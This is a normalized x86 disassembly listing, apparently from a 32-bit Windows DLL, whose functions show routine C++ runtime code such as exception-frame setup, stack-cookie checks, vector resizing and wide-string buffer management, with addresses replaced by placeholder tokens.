mov ecx [ edi + 0x8 ]
xor ebx ebx
xor esi esi
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx [ edi + 0x60 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
lea ebx [ ebx ]
xor eax eax
mov ecx edi
call sub_100034c0
mov ecx [ edi + 0x60 ]
lea edx [ ebp - 0x20 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax 0x1
jmp r-xdata
inc esi
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x20 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ecx eax
mov edx [ eax ]
mov eax [ edx + 0xc ]
call eax
cmp al 0x9
jne r-xdata
test ebx ebx
je r-xdata
inc ebx
push eax
mov ecx edi
call sub_100032e0
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x20 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
cmp esi eax
jb r-xdata
sub_100032e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b820
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov ecx esi
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0x2
mov ecx esi
mov eax [ esi ]
jne r-xdata
call [ eax + 0x4 ]
test eax eax
jne r-xdata
push r--data
call [ eax + 0x14 ]
mov ecx [ edi + 0x38 ]
movzx edx [ eax + 0x10 ]
mov eax [ edi + 0x34 ]
cmp eax ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc ]
inc [ edi + 0x68 ]
lea ecx [ ebp - 0x24 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
cmp eax 0x9
jne r-xdata
inc [ edi + 0x68 ]
lea ecx [ ebp - 0x24 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ eax ] dx
je r-xdata
mov eax [ esi ]
mov ecx esi
push r--data
call [ eax + 0x14 ]
mov edx [ edi ]
mov ecx edi
inc [ edi + 0x70 ]
mov ebx eax
call [ edx + 0xc ]
mov edx [ ebx + 0x10 ]
mov esi [ edi + 0x34 ]
mov eax [ edi + 0x38 ]
cmp edx [ ebx + 0xc ]
jne r-xdata
mov ecx [ edi + 0x64 ]
lea edx [ ebp - 0x24 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ edi + 0x64 ]
lea edx [ ebp - 0x24 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x24 ] r--data
mov [ eax + 0x8 ] 0x0
add eax 0xc
cmp eax ecx
jne r-xdata
cmp esi eax
je r-xdata
cmp esi eax
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx ecx [ ebx + 0xa ]
lea ebx [ ebx ]
movzx ecx [ ebx + 0xa ]
lea esp [ esp ]
mov [ esi + 0x8 ] edx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ esi + 0x8 ] eax
jbe r-xdata
add esi 0xc
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
add esi 0xc
cmp esi eax
jne r-xdata
mov [ esi + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ esi ] cx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x34 ]
call sub_100037e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ esi ] cx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100034c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b84b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov edx [ edi + 0x38 ]
mov eax 0x2aaaaaab
sub edx [ edi + 0x34 ]
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax ]
mov esi [ edi + 0x34 ]
mov ebx eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
call [ edx + 0xc ]
sub eax [ esi + 0x8 ]
cmp ebx eax
jbe r-xdata
push ebx
call sub_1003c61a
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov edx [ ecx ]
push ebx
push eax
push [ esi + 0x8 ]
call [ edx + 0x14 ]
mov cx [ esi ]
mov [ ebp - 0x28 ] cx
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov edx [ ecx ]
call [ edx + 0xc ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ecx ]
call [ eax + 0x18 ]
push 0x54
mov [ ebp - 0x18 ] eax
call sub_1003cdeb
mov ecx eax
add esp 0x4
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ebx eax
sub ebx [ esi + 0x8 ]
xor esi esi
movq xmm0 [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
push ecx
push ebx
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
sub esp 0xc
mov eax esp
movq [ eax ] xmm0
mov [ eax + 0x8 ] edx
movzx eax [ edi + 0x24 ]
push eax
call sub_10035560
mov esi eax
jmp r-xdata
mov eax [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
add edx eax
xor edx edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push ebx
call j_sub_1003f3e3
add esp 0x4
test esi esi
jne r-xdata
mov ecx [ edi + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
sub_10003600
push ebp
mov ebp esp
push esi
mov esi ecx
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10003640
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
push 0xffffffff
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10003670
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_10003980
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100036b0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
pop esi
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100036e0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_10003710
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10003b10
sub edi eax
mov eax 0x2aaaaaab
imul edi
sar edx 0x1
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0xc
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
movq xmm0 [ edi ]
movq [ ecx ] xmm0
mov eax [ edi + 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax [ esi ]
lea ecx [ edi + edi * 2 ]
lea eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10003b10
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
movq xmm0 [ eax ]
movq [ ecx ] xmm0
mov eax [ eax + 0x8 ]
mov [ ecx + 0x8 ] eax
sub_100037e0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
push edi
mov edi ecx
lea eax [ edx + 0xc ]
mov esi [ edi + 0x4 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ edi + 0x4 ] 0xfffffff4
pop edi
pop esi
mov [ eax ] edx
pop ebp
retn 0x8
movq xmm0 [ eax ]
lea edx [ edx + 0xc ]
movq [ edx - 0xc ] xmm0
mov ecx [ eax + 0x8 ]
add eax 0xc
mov [ edx - 0x4 ] ecx
cmp eax esi
jne r-xdata
mov edx [ ebp + 0xc ]
sub_10003820
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b8a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
sub edx [ edi ]
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
push eax
call sub_10003ba0
test al al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10004170
add esp 0xc
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
sub_100038e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10003c10
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov [ ecx ] eax
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10003c10
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ eax + edi * 4 ]
mov [ ecx ] eax
sub_10003980
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
add eax eax
push eax
push esi
push edi
call sub_1003c640
add esp 0xc
jmp r-xdata
sub_10003a20
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov edi [ ebx + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_1003c5ec
sub edi ecx
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
push ecx
push edi
mov ecx esi
call sub_10003d30
test al al
je r-xdata
lea eax [ edi + ecx ]
cmp [ esi + 0x10 ] eax
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
push r--data
call sub_1003c5ec
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
xor edi edi
push ecx
push edi
mov ecx esi
mov [ edx + eax * 2 ] di
call sub_10003c80
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
lea eax [ edi + edi ]
push eax
mov eax [ ebp + 0xc ]
lea eax [ ebx + eax * 2 ]
push eax
push ecx
call sub_1003dc80
add esp 0xc
test edi edi
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_10003b10
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x2aaaaaab
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x2aaaaaab
imul esi
push ebx
sar edx 0x1
mov ebx 0x15555555
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x2aaaaaab
imul edi
inc esi
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_10003d90
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_10003d90
pop edi
pop esi
retn 0x4
sub_10003ba0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
test eax eax
jne r-xdata
cmp eax 0x15555555
ja r-xdata
xor al al
pop esi
pop ebp
retn 0x4
push r--data
call sub_1003c5be
push edi
lea edi [ eax + eax * 2 ]
shl edi 0x2
push edi
call sub_1003cdeb
add esp 0x4
test eax eax
je r-xdata
call sub_1003c58d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
add eax edi
mov [ esi + 0x8 ] eax
mov al 0x1
pop edi
pop esi
pop ebp
retn 0x4
sub_10003c10
mov edx [ ecx + 0x8 ]
mov eax edx
push esi
mov esi [ ecx + 0x4 ]
sub eax esi
sar eax 0x2
cmp eax 0x1
jae r-xdata
pop esi
retn 0x4
sub esi [ ecx ]
push edi
mov edi 0x3fffffff
sar esi 0x2
mov eax edi
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edx [ ecx ]
inc esi
sar edx 0x2
mov eax edx
shr eax 0x1
sub edi eax
cmp edi edx
pop edi
jae r-xdata
add edx eax
cmp edx esi
cmovb edx esi
push edx
call sub_10003e80
xor edx edx
cmp edx esi
cmovb edx esi
push edx
call sub_10003e80
pop esi
retn 0x4
sub_10003c80
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_1003c5ec
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
pop edi
pop esi
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
pop ebx
jb r-xdata
add eax eax
push eax
lea eax [ ebx + edx * 2 ]
push eax
push ebx
call sub_1003c640
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx * 2 ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_10003d30
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
ja r-xdata
push r--data
call sub_1003c5be
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
test esi esi
jne r-xdata
push [ ecx + 0x10 ]
push esi
call sub_10003f60
xor eax eax
cmp eax esi
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x8
xor eax eax
cmp eax esi
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x8
mov [ ecx + 0x10 ] esi
cmp eax 0x8
jb r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
sub_10003d90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b8c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_100041f0
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp + 0x8 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp edi 0x15555555
ja r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 4 ]
mov [ ebx + 0x8 ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 4 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp + 0x8 ]
call sub_1003c58d
lea eax [ edi + edi * 2 ]
shl eax 0x2
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10003e80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b8e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
sub eax ecx
and eax 0xfffffffc
push eax
push ecx
push esi
call sub_1003c640
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov eax [ edi + 0x4 ]
sub eax ecx
sar eax 0x2
mov [ ebp + 0x8 ] eax
test ecx ecx
je r-xdata
cmp ebx 0x3fffffff
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
lea eax [ esi + eax * 4 ]
mov [ edi + 0x4 ] eax
mov [ edi ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ecx
call j_sub_1003f3e3#2
add esp 0x4
call sub_1003c58d
lea eax [ ebx * 4 ]
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10003f60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b911
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x18 ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov ecx ebx
shr ecx 0x1
mov eax 0xaaaaaaab
mul edi
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push eax
call sub_100040e0
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0x7ffffffe
sub eax ecx
cmp ebx eax
lea edi [ ecx + ebx ]
jbe r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edi 0x7ffffffe
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi ] ax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jb r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov edx esi
mov edx [ esi ]
jmp r-xdata
xor eax eax
mov [ esi + ebx * 2 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi [ esi ]
lea eax [ ebx + ebx ]
push eax
push edx
push ecx
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
sub_100040a5
mov esi [ ebp - 0x18 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi ] ax
push eax
push eax
call sub_1003e35b
int3
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100040e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x4
cmp eax 0x7fffffff
ja r-xdata
call sub_1003c58d
add eax eax
push eax
call sub_1003cdeb
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
sub_10004110
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
movq xmm0 [ eax ]
movq [ ecx ] xmm0
mov eax [ eax + 0x8 ]
mov [ ecx + 0x8 ] eax
sub_10004170
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b960
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0xc
mov [ ebp + 0x8 ] esi
add ecx 0xc
mov [ ebp - 0x14 ] ecx
jmp r-xdata
movq xmm0 [ ecx ]
movq [ esi ] xmm0
mov eax [ ecx + 0x8 ]
mov [ esi + 0x8 ] eax
cmp ecx edx
je r-xdata
sub_100041f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b991
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
add esi 0xc
mov [ ebp + 0x8 ] esi
add ecx 0xc
mov [ ebp - 0x18 ] ecx
jmp r-xdata
movq xmm0 [ ecx ]
movq [ esi ] xmm0
mov eax [ ecx + 0x8 ]
mov [ esi + 0x8 ] eax
cmp ecx edx
je r-xdata
sub_10004290
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
